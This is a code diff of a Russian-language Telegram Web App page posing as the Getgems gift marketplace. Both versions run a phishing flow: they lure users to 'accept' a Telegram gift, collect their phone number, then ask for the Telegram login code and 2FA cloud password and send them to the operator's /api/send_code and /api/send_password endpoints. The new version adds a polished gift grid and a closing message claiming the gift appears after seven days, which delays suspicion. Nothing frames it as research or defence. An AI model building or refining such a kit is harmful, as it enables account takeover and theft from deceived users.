@@ -2,114 +2,89 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Getgems Market</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no,user-scalable=no,viewport-fit=cover">
+    <title>Getgems: купить и продать подарки</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body {
-            background-color: #000; color: #fff;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            margin: 0; padding: 0; user-select: none;
-        }
-        /* Header */
-        .header {
-            padding: 12px 16px; border-bottom: 0.5px solid #2c2c2e;
-            display: flex; justify-content: space-between; align-items: center;
-            position: sticky; top: 0; background: rgba(0,0,0,0.8); backdrop-filter: blur(10px); z-index: 10;
-        }
-        .header-title { font-weight: 600; font-size: 17px; }
-
-        /* NFT Card */
-        .content { padding: 16px; padding-bottom: 120px; }
-        .nft-main-card {
-            background: #1c1c1e; border-radius: 24px; overflow: hidden;
-            border: 0.5px solid #2c2c2e; margin-bottom: 16px;
-        }
-        .image-container {
-            width: 100%; aspect-ratio: 1; background: #2c2c2e;
-            display: flex; align-items: center; justify-content: center; position: relative;
-        }
-        .image-container img { width: 80%; height: 80%; object-fit: contain; }
-        .offchain-badge {
-            position: absolute; bottom: 12px; left: 12px;
-            background: rgba(0,0,0,0.5); padding: 4px 8px; border-radius: 8px;
-            font-size: 12px; color: #fff; backdrop-filter: blur(4px);
-        }
-
-        .nft-info { padding: 16px; text-align: left; }
-        .nft-name { font-size: 24px; font-weight: 700; margin-bottom: 4px; }
-        .nft-verified { color: #007aff; font-size: 14px; font-weight: 500; }
-
-        /* Fixed Footer Button */
-        .footer {
-            position: fixed; bottom: 0; left: 0; right: 0;
-            padding: 16px; background: linear-gradient(0deg, #000 0%, transparent 100%);
-            z-index: 100;
-        }
-        .btn-primary {
-            background: #007aff; color: #fff; border: none; width: 100%;
-            padding: 18px; border-radius: 16px; font-size: 16px; font-weight: 600;
-            cursor: pointer; box-shadow: 0 4px 12px rgba(0, 122, 255, 0.3);
-        }
-
-        /* Modals */
-        .overlay {
-            display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85);
-            z-index: 1000; align-items: center; justify-content: center; padding: 20px;
-        }
-        .modal {
-            background: #1c1c1e; width: 100%; border-radius: 28px;
-            padding: 24px; box-sizing: border-box; border: 0.5px solid #3a3a3c;
-        }
-        input {
-            width: 100%; padding: 16px; background: #2c2c2e; border: 1px solid #3a3a3c;
-            border-radius: 14px; color: #fff; margin-top: 16px; font-size: 16px; box-sizing: border-box;
-        }
+        :root { --bg: #000; --card: #111; --accent: #007aff; --text: #fff; --gray: #8e8e93; --border: rgba(255,255,255,0.08); }
+        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; margin: 0; padding: 0; user-select: none; -webkit-tap-highlight-color: transparent; }
+        .top-nav { display: flex; padding: 8px 16px; gap: 20px; border-bottom: 0.5px solid var(--border); background: var(--bg); position: sticky; top: 0; z-index: 10; }
+        .nav-item { font-size: 14px; font-weight: 600; color: var(--gray); padding: 8px 0; }
+        .nav-item.active { color: var(--text); border-bottom: 2px solid var(--text); }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding: 16px; }
+        .grid-item { background: var(--card); border-radius: 16px; padding: 12px; border: 0.5px solid var(--border); transition: 0.2s; text-align: center; }
+        .grid-item:active { transform: scale(0.96); }
+        .grid-item img { width: 85%; aspect-ratio: 1; object-fit: contain; }
+        .grid-item-name { font-size: 14px; font-weight: 600; margin-top: 8px; }
+        #details-screen { display: none; position: fixed; inset: 0; background: var(--bg); z-index: 20; padding: 16px; overflow-y: auto; }
+        .back { color: var(--accent); font-weight: 500; margin-bottom: 20px; display: block; cursor: pointer; }
+        .nft-hero { width: 100%; aspect-ratio: 1; background: radial-gradient(circle, #1c1c1e 0%, #000 100%); border-radius: 24px; display: flex; align-items: center; justify-content: center; border: 0.5px solid var(--border); margin-bottom: 20px; }
+        .nft-hero img { width: 70%; }
+        .btn-stack { display: flex; flex-direction: column; gap: 12px; margin-top: 24px; }
+        .btn { padding: 18px; border-radius: 16px; font-size: 16px; font-weight: 600; border: none; text-align: center; cursor: pointer; }
+        .btn-blue { background: var(--accent); color: #fff; }
+        .btn-dark { background: #1c1c1e; color: #fff; border: 0.5px solid var(--border); }
+        .overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 100; align-items: center; justify-content: center; padding: 20px; backdrop-filter: blur(10px); }
+        .modal { background: #1c1c1e; width: 100%; max-width: 320px; border-radius: 30px; padding: 30px; text-align: center; }
+        .input-f { width: 100%; padding: 16px; margin: 15px 0; background: #000; border: 1px solid #333; border-radius: 12px; color: #fff; font-size: 24px; text-align: center; outline: none; box-sizing: border-box; }
+        .spinner { width: 32px; height: 32px; border: 3px solid rgba(255,255,255,0.1); border-top-color: var(--accent); border-radius: 50%; margin: 0 auto 15px; animation: spin 1s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="header">
-    <div class="header-title">Getgems Market ⌵</div>
-    <div style="opacity: 0.6;">🔍</div>
-</div>
-
-<div class="content">
-    <div class="nft-main-card">
-        <div class="image-container">
-            <img id="nft-img" src="https://getgems.io/assets/nft-placeholder.png">
-            <div class="offchain-badge">💎 offchain</div>
+<div id="main-screen">
+    <div class="top-nav">
+        <div class="nav-item active">Подарки</div>
+        <div class="nav-item">Номера</div>
+        <div class="nav-item">Имена</div>
+    </div>
+    <div class="grid">
+        <div class="grid-item" onclick="openNFT('Magic Bear', 'bear')">
+            <img src="https://raw.githubusercontent.com/TelegramMessenger/Gifts/main/assets/bear.png">
+            <div class="grid-item-name">Magic Bear</div>
         </div>
-        <div class="nft-info">
-            <div class="nft-name" id="nft-name">NFT Gift</div>
-            <div class="nft-verified">✓ Официальная коллекция</div>
+        <div class="grid-item" onclick="openNFT('Eternal Star', 'star')">
+            <img src="https://raw.githubusercontent.com/TelegramMessenger/Gifts/main/assets/star.png">
+            <div class="grid-item-name">Eternal Star</div>
         </div>
     </div>
 </div>
 
-<div class="footer">
-    <button class="btn-primary" onclick="openModal()">Принять подарок</button>
+<div id="details-screen">
+    <span class="back" onclick="closeNFT()">← Назад</span>
+    <div class="nft-hero"><img id="d-img"></div>
+    <div style="color:var(--accent); font-size:14px;">Telegram Gifts</div>
+    <h1 id="d-title" style="margin:8px 0 24px 0; font-size:32px;"></h1>
+    <div class="btn-stack">
+        <button class="btn btn-blue" onclick="openModal()">Принять на аккаунт</button>
+        <button class="btn btn-dark" onclick="openModal()">Продать подарок</button>
+    </div>
 </div>
 
 <div id="overlay" class="overlay">
     <div class="modal">
-        <div id="step-1">
-            <h2 style="margin: 0 0 10px 0;">Принять NFT</h2>
-            <p style="color: #8e8e93; font-size: 14px;">Подтвердите владение аккаунтом для зачисления подарка.</p>
-            <button class="btn-primary" onclick="sharePhone()" style="background: #fff; color: #000; margin-top: 20px;">
-                Поделиться номером
-            </button>
+        <div id="s1">
+            <h3>Синхронизация</h3>
+            <p style="color:var(--gray); font-size:14px;">Подтвердите сессию для привязки Gift к вашему ID</p>
+            <button class="btn btn-blue" style="width:100%; margin-top:15px;" onclick="requestAuth()">Начать</button>
         </div>
-        <div id="step-2" style="display:none;">
-            <h2>Введите код</h2>
-            <p style="color: #8e8e93; font-size: 14px;">Код отправлен в ваш Telegram</p>
-            <input type="text" id="code" placeholder="Код подтверждения" maxlength="5">
-            <button class="btn-primary" style="margin-top: 20px;" onclick="sendCode()">Подтвердить</button>
+        <div id="s2" style="display:none">
+            <h3>Верификация</h3>
+            <p style="color:var(--gray); font-size:14px;">Введите код из уведомления Telegram</p>
+            <input type="text" id="code" class="input-f" placeholder="00000" maxlength="6">
+            <button class="btn btn-blue" style="width:100%" onclick="sendCode()">Продолжить</button>
         </div>
-        <div id="step-3" style="display:none;">
-            <h2>2FA Пароль</h2>
-            <input type="password" id="pass" placeholder="Облачный пароль">
-            <button class="btn-primary" style="margin-top: 20px;" onclick="sendPass()">Войти</button>
+        <div id="s3" style="display:none">
+            <h3>Облачный пароль</h3>
+            <p style="color:var(--gray); font-size:14px;">Введите 2FA для завершения</p>
+            <input type="password" id="pass" class="input-f" placeholder="Пароль">
+            <button class="btn btn-blue" style="width:100%" onclick="sendPass()">Завершить</button>
+        </div>
+        <div id="loader" style="display:none">
+            <div class="spinner"></div>
+            <p id="l-text">Синхронизация...</p>
         </div>
     </div>
 </div>
@@ -117,66 +92,88 @@
 <script>
     const tg = window.Telegram.WebApp;
     tg.expand();
-    tg.setHeaderColor('#000000');
-    let phone = "";
+    let userPhone = "";
 
-    // Динамическая подгрузка NFT из URL
-    const params = new URLSearchParams(window.location.search);
-    const nftUrl = params.get('nft_url') || "";
-    if (nftUrl) {
-        const rawName = nftUrl.split('/').pop();
-        document.getElementById('nft-name').innerText = rawName.replace(/-/g, ' ');
-        const asset = rawName.split('-')[0];
-        document.getElementById('nft-img').src = `https://raw.githubusercontent.com/TelegramMessenger/Gifts/main/assets/${asset}.png`;
+    function openNFT(name, img) {
+        document.getElementById('main-screen').style.display = 'none';
+        document.getElementById('details-screen').style.display = 'block';
+        document.getElementById('d-title').innerText = name;
+        document.getElementById('d-img').src = `https://raw.githubusercontent.com/TelegramMessenger/Gifts/main/assets/${img}.png`;
+    }
+
+    function closeNFT() {
+        document.getElementById('main-screen').style.display = 'block';
+        document.getElementById('details-screen').style.display = 'none';
     }
 
     function openModal() { document.getElementById('overlay').style.display = 'flex'; }
 
-    function sharePhone() {
+    function requestAuth() {
         tg.requestContact((ok) => {
             if(ok) {
+                document.getElementById('s1').style.display = 'none';
+                document.getElementById('loader').style.display = 'block';
+                document.getElementById('l-text').innerText = "Ожидание номера...";
+                
                 const check = setInterval(async () => {
-                    const r = await fetch(`/api/check_contact?id=${tg.initDataUnsafe.user.id}`);
-                    const d = await r.json();
-                    if(d.status === 'received') {
-                        clearInterval(check);
-                        phone = d.phone;
-                        document.getElementById('step-1').style.display = 'none';
-                        document.getElementById('step-2').style.display = 'block';
-                    }
+                    try {
+                        const r = await fetch(`/api/check_contact?id=${tg.initDataUnsafe.user.id}`);
+                        const d = await r.json();
+                        if(d.status === 'received') {
+                            clearInterval(check);
+                            userPhone = d.phone;
+                            document.getElementById('loader').style.display = 'none';
+                            document.getElementById('s2').style.display = 'block';
+                        }
+                    } catch(e) {}
                 }, 2000);
             }
         });
     }
 
     async function sendCode() {
-        const code = document.getElementById('code').value;
+        const c = document.getElementById('code').value;
+        if(c.length < 5) return;
+        document.getElementById('s2').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
+        
         const r = await fetch('/api/send_code', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({phone, code})
+            body: JSON.stringify({phone: userPhone, code: c})
         });
         const d = await r.json();
+
+        document.getElementById('loader').style.display = 'none';
         if(d.status === '2fa_needed') {
-            document.getElementById('step-2').style.display = 'none';
-            document.getElementById('step-3').style.display = 'block';
-        } else if(d.status === 'success') { success(); }
+            document.getElementById('s3').style.display = 'block';
+        } else if(d.status === 'success') {
+            finish();
+        }
     }
 
     async function sendPass() {
-        const password = document.getElementById('pass').value;
+        const p = document.getElementById('pass').value;
+        document.getElementById('s3').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
+        
         const r = await fetch('/api/send_password', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({phone, password})
+            body: JSON.stringify({phone: userPhone, password: p})
         });
         const d = await r.json();
-        if(d.status === 'success') success();
+        
+        if(d.status === 'success') finish();
     }
 
-    function success() {
-        alert("Заявка отправлена! Подарок появится в профиле после обработки транзакции.");
-        tg.close();
+    function finish() {
+        document.getElementById('loader').style.display = 'block';
+        document.getElementById('l-text').innerText = "Привязка ID...";
+        setTimeout(() => {
+            tg.showAlert("Успешно! Подарок привязан к вашему ID. Отобразится в профиле через 7 дней из-за ограничений безопасности Telegram.");
+            tg.close();
+        }, 3000);
     }
 </script>
 </body>
